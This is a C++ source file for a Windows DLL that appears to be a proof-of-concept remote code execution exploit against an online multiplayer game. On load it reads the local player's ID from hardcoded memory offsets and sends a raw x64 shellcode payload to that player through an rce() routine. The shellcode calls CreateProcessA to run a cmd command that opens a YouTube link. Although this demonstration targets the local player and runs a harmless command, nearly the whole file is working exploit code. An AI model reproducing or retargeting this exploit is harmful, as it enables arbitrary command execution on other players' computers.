#include <Windows.h>
#include "rce.h"
#include "DeepPtr.hpp"

static const std::vector<uint8_t> payload = {
    0x48, 0x83, 0xEC, 0x58, 0x48, 0xB9, 0xAC, 0x6A, 0x78, 0x44, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15,
    0xDC, 0xCF, 0x61, 0x00, 0x48, 0xBA, 0xC6, 0x6A, 0x78, 0x44, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0xC8, 0xFF, 0x15, 0x59, 0xD2, 0x61, 0x00, 0x48, 0xBB, 0x94, 0x6A, 0x78, 0x44, 0x01, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x5C, 0x24, 0x48, 0x48, 0xBB, 0x28, 0x6A, 0x78, 0x44, 0x01, 0x00, 0x00, 0x00,
    0x48, 0x89, 0x5C, 0x24, 0x40, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24,
    0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24,
    0x20, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x48, 0xBA, 0xD5, 0x6A, 0x78,
    0x44, 0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC9, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x58, 0xE9, 0xC7,
    0x33, 0x84, 0xFD, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4B, 0x00, 0x65, 0x00,
    0x72, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x64, 0x00,
    0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63,
    0x65, 0x73, 0x73, 0x41, 0x00, 0x63, 0x6D, 0x64, 0x20, 0x2F, 0x63, 0x20, 0x73, 0x74, 0x61, 0x72,
    0x74, 0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x79, 0x6F,
    0x75, 0x74, 0x75, 0x62, 0x65, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x61, 0x74, 0x63, 0x68, 0x3F,
    0x76, 0x3D, 0x64, 0x51, 0x77, 0x34, 0x77, 0x39, 0x57, 0x67, 0x58, 0x63, 0x51, 0x00
};

DWORD exploitThread(LPVOID lParam)
{
    AllocConsole();
    SetConsoleTitleW(L"Proof-of-concept NRSSR RCE exploit");

    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    freopen_s(&fDummy, "CONIN$", "r", stdin);

    uint32_t* player_id = AccessDeepPtr<uint32_t>(0x144777FA8, 0, 0x60, 0x518);
    if (player_id == NULL)
    {
        printf("Local player ID not found! Make sure you are connected to the matchmaking servers.\n");
        return 0;
    }
    printf("Local player ID: %d\nSending exploit to local player in 5 seconds!\n", *player_id);

    Sleep(5000);
    std::vector<uint32_t> player_ids{ *player_id };
    if (!rce(payload, player_ids))
    {
        printf("Failed to send exploit to the local player.\n");
    }
    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, exploitThread, NULL, 0, NULL);

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

